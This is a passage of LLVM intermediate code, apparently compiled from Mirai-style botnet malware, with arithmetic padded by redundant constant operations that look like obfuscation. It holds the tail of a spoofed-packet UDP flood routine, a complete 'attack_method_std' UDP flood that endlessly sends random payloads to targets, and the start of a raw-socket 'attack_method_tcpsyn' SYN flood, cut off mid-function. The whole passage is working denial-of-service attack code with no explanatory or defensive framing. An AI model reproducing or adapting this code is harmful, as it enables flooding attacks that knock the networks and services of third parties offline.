  %436 = xor i32 65535, -1
  %437 = xor i32 %435, %436
  %438 = and i32 %437, %435
  %439 = and i32 %435, 65535
  %440 = trunc i32 %438 to i16
  %441 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 0
  store i16 %440, i16* %442, align 2
  br label %443

; <label>:443:                                    ; preds = %434, %430
  %444 = load i16, i16* %17, align 2
  %445 = zext i16 %444 to i32
  %446 = icmp eq i32 %445, 65535
  br i1 %446, label %447, label %456

; <label>:447:                                    ; preds = %443
  %448 = call i32 @rand_next()
  %449 = xor i32 65535, -1
  %450 = xor i32 %448, %449
  %451 = and i32 %450, %448
  %452 = and i32 %448, 65535
  %453 = trunc i32 %451 to i16
  %454 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %455 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %454, i32 0, i32 1
  store i16 %453, i16* %455, align 2
  br label %456

; <label>:456:                                    ; preds = %447, %443
  %457 = load i8, i8* %20, align 1
  %458 = icmp ne i8 %457, 0
  br i1 %458, label %463, label %459

; <label>:459:                                    ; preds = %456
  %460 = call i32 @rand_next()
  %461 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 9
  store i32 %460, i32* %462, align 4
  br label %469

; <label>:463:                                    ; preds = %456
  %464 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 9
  %466 = load i32, i32* %465, align 4
  %467 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 9
  store i32 %466, i32* %468, align 4
  br label %469

; <label>:469:                                    ; preds = %463, %459
  %470 = call i32 @rand_next()
  store i32 %470, i32* %37, align 4
  %471 = call i32 @rand_next()
  store i32 %471, i32* %38, align 4
  %472 = call i32 @rand_next()
  store i32 %472, i32* %39, align 4
  %473 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %474 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %473, i32 0, i32 0
  %475 = getelementptr inbounds [6 x i8], [6 x i8]* %474, i32 0, i32 0
  %476 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %475, i8* %476, i32 4)
  %477 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %478 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %477, i32 0, i32 1
  %479 = getelementptr inbounds [6 x i8], [6 x i8]* %478, i32 0, i32 0
  %480 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %479, i8* %480, i32 4)
  %481 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %482 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %481, i32 0, i32 0
  %483 = getelementptr inbounds [6 x i8], [6 x i8]* %482, i32 0, i32 0
  %484 = getelementptr inbounds i8, i8* %483, i64 4
  %485 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %484, i8* %485, i32 2)
  %486 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %487 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %486, i32 0, i32 1
  %488 = getelementptr inbounds [6 x i8], [6 x i8]* %487, i32 0, i32 0
  %489 = getelementptr inbounds i8, i8* %488, i64 4
  %490 = bitcast i32* %39 to i8*
  %491 = getelementptr inbounds i8, i8* %490, i64 2
  call void @util_memcpy(i8* %489, i8* %491, i32 2)
  %492 = load i8, i8* %19, align 1
  %493 = icmp ne i8 %492, 0
  br i1 %493, label %494, label %497

; <label>:494:                                    ; preds = %469
  %495 = load i8*, i8** %36, align 8
  %496 = load i32, i32* %18, align 4
  call void @rand_str(i8* %495, i32 %496)
  br label %497

; <label>:497:                                    ; preds = %494, %469
  %498 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 7
  store i16 0, i16* %499, align 2
  %500 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %501 = bitcast %struct.iphdr* %500 to i16*
  %502 = call zeroext i16 @checksum_generic(i16* %501, i32 20)
  %503 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 7
  store i16 %502, i16* %504, align 2
  %505 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 7
  store i16 0, i16* %506, align 2
  %507 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %508 = bitcast %struct.iphdr* %507 to i16*
  %509 = call zeroext i16 @checksum_generic(i16* %508, i32 20)
  %510 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 7
  store i16 %509, i16* %511, align 2
  %512 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %513 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %512, i32 0, i32 3
  store i16 0, i16* %513, align 2
  %514 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %515 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %516 = bitcast %struct.udphdr* %515 to i8*
  %517 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %518 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %517, i32 0, i32 2
  %519 = load i16, i16* %518, align 2
  %520 = load i32, i32* %18, align 4
  %521 = sext i32 %520 to i64
  %522 = sub i64 8, -2983997310872817730
  %523 = add i64 %522, %521
  %524 = add i64 %523, -2983997310872817730
  %525 = add i64 8, %521
  %526 = trunc i64 %524 to i32
  %527 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %514, i8* %516, i16 zeroext %519, i32 %526)
  %528 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %529 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %528, i32 0, i32 3
  store i16 %527, i16* %529, align 2
  %530 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %531 = load i32, i32* %9, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i64 %532
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i32 0, i32 0
  %535 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %534, i32 0, i32 0
  store i16 2, i16* %535, align 4
  %536 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 9
  %538 = load i32, i32* %537, align 4
  %539 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i32 0, i32 0
  %544 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %543, i32 0, i32 2
  %545 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %544, i32 0, i32 0
  store i32 %538, i32* %545, align 4
  %546 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %547 = load i32, i32* %9, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i64 %548
  %550 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %549, i32 0, i32 0
  %551 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %550, i32 0, i32 1
  store i16 0, i16* %551, align 2
  %552 = load i32, i32* %10, align 4
  %553 = load i8*, i8** %30, align 8
  %554 = load i32, i32* %18, align 4
  %555 = sext i32 %554 to i64
  %556 = add i64 66, 726558007068911206
  %557 = add i64 %556, %555
  %558 = sub i64 %557, 726558007068911206
  %559 = add i64 66, %555
  %560 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %561 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %562 = load i32, i32* %9, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %561, i64 %563
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %564, i32 0, i32 0
  %566 = bitcast %struct.sockaddr_in* %565 to %struct.sockaddr*
  store %struct.sockaddr* %566, %struct.sockaddr** %560, align 8
  %567 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %568 = load %struct.sockaddr*, %struct.sockaddr** %567, align 8
  %569 = call i64 @sendto(i32 %552, i8* %553, i64 %558, i32 16384, %struct.sockaddr* %568, i32 16)
  br label %570

; <label>:570:                                    ; preds = %497
  %571 = load i32, i32* %9, align 4
  %572 = sub i32 0, 1
  %573 = sub i32 %571, %572
  %574 = add nsw i32 %571, 1
  store i32 %573, i32* %9, align 4
  br label %330

; <label>:575:                                    ; preds = %330
  br label %329

; <label>:576:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %178

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 %132, 1505040161
  %143 = add i32 %142, %141
  %144 = add i32 %143, 1505040161
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 0, 1
  %176 = sub i32 %174, %175
  %177 = add nsw i32 %174, 1
  store i32 %176, i32* %9, align 4
  br label %58

; <label>:178:                                    ; preds = %58
  br label %179

; <label>:179:                                    ; preds = %212, %178
  store i32 0, i32* %9, align 4
  br label %180

; <label>:180:                                    ; preds = %207, %179
  %181 = load i32, i32* %9, align 4
  %182 = load i8, i8* %5, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %212

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %10, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %22, align 8
  %191 = load i8, i8* %15, align 1
  %192 = icmp ne i8 %191, 0
  br i1 %192, label %193, label %197

; <label>:193:                                    ; preds = %185
  %194 = load i8*, i8** %22, align 8
  %195 = load i16, i16* %14, align 2
  %196 = zext i16 %195 to i32
  call void @rand_str(i8* %194, i32 %196)
  br label %197

; <label>:197:                                    ; preds = %193, %185
  %198 = load i32*, i32** %11, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = load i8*, i8** %22, align 8
  %204 = load i16, i16* %14, align 2
  %205 = zext i16 %204 to i64
  %206 = call i64 @send(i32 %202, i8* %203, i64 %205, i32 16384)
  br label %207

; <label>:207:                                    ; preds = %197
  %208 = load i32, i32* %9, align 4
  %209 = sub i32 0, 1
  %210 = sub i32 %208, %209
  %211 = add nsw i32 %208, 1
  store i32 %210, i32* %9, align 4
  br label %180

; <label>:212:                                    ; preds = %180
  br label %179
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %636

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %636

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %447, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %452

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
